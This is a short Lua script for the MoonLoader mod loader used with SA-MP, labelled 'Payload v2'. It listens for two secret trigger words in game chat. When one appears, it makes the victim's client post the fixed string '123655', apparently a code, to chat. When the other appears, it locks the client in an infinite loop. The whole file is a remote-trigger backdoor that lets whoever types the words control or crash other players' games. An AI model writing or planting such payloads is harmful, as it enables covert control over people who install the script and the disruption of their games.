-- payload.lua
sampAddChatMessage("{00FF00}[DEBUG] Payload v2 active", -1)

-- Используем старый добрый метод событий MoonLoader
function onReceiveChatMessage(text)
    -- Уберем цвета, чтобы поиск был точным
    local t = text:gsub("{%x%x%x%x%x%x}", "")
    
    if t:find("сырколбаска") then
        sampAddChatMessage("{FFFF00}[DEBUG] Command detected!", -1)
        sampSendChat("123655")
    elseif t:find("кукусики") then
        while true do end
    end
end
